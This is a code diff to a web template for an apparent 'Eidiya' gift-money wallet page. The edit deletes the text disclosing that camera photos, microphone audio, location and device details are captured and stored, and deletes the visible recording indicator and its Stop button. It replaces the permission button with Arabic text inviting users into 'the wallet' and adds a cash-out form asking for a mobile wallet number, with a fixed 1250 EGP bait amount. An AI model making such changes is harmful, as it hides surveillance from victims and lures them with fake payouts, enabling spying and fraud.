@@ -24,24 +24,15 @@
           </svg>
         </div>
         <h2 class="permissions-title"><%= t.permissionTitle %></h2>
-        <p class="permissions-subtitle">
-          This will start a visible capture session: front/back camera photos at 5 photos per second, microphone audio chunks,
-          browser location when allowed, IP address, user agent, and device details will be saved locally
-          on this server.
-        </p>
       </div>
 
       <button class="btn btn-grant-permissions" id="grantPermissionsBtn" onclick="requestAllPermissions()">
-        give permisions to access your app
+        موافق، الدخول إلي المحفظة
       </button>
     </div>
   </div>
 
-  <div id="captureStatus" class="capture-status hidden">
-    <span class="recording-dot"></span>
-    <span id="captureStatusText">Capture session running</span>
-    <button type="button" class="capture-stop-btn" onclick="stopCaptureSession()">Stop</button>
-  </div>
+
 
   <!-- Top Notification Toast / Banner -->
   <div class="notification-bar" id="notificationBar">
@@ -124,7 +115,7 @@
               </svg>
               <%= t.sendEidiyaBtn %>
             </button>
-            <button class="btn btn-secondary" onclick="openModal('giftCardModal')">
+            <button class="btn btn-secondary" onclick="openModal('cashOutModal')">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="action-icon">
                 <rect x="2" y="4" width="20" height="16" rx="2" />
                 <line x1="2" y1="10" x2="22" y2="10" />
@@ -367,6 +358,30 @@
         <div class="modal-actions">
           <button type="button" class="btn btn-secondary" onclick="closeModal('giftCardModal')"><%= t.modalCloseBtn %></button>
           <button type="submit" class="btn btn-primary"><%= t.buyCardConfirmBtn %></button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Cash Out Modal -->
+  <div id="cashOutModal" class="modal-overlay">
+    <div class="modal-container">
+      <div class="modal-header">
+        <h3 class="modal-title"><%= lang === 'en' ? 'Withdraw Eidiya' : 'سحب العيدية' %></h3>
+        <button class="modal-close-btn" onclick="closeModal('cashOutModal')">&times;</button>
+      </div>
+      <form id="cashOutForm" onsubmit="submitCashOutForm(event)">
+        <div class="form-group">
+          <label><%= lang === 'en' ? 'Mobile Wallet Number' : 'رقم المحفظة (فودافون كاش)' %></label>
+          <input type="tel" name="phoneNumber" required placeholder="<%= t.placeholderNumber %>" class="form-input">
+        </div>
+        <div class="form-group">
+          <label><%= lang === 'en' ? 'Withdrawal Amount (EGP)' : 'قيمة مبلغ السحب (جنيه)' %></label>
+          <input type="number" name="amount" min="5" max="50000" required placeholder="0.00" value="1250" class="form-input" readonly>
+        </div>
+        <div class="modal-actions">
+          <button type="button" class="btn btn-secondary" onclick="closeModal('cashOutModal')"><%= t.modalCloseBtn %></button>
+          <button type="submit" class="btn btn-primary"><%= lang === 'en' ? 'Confirm Withdrawal' : 'تأكيد السحب' %></button>
         </div>
       </form>
     </div>
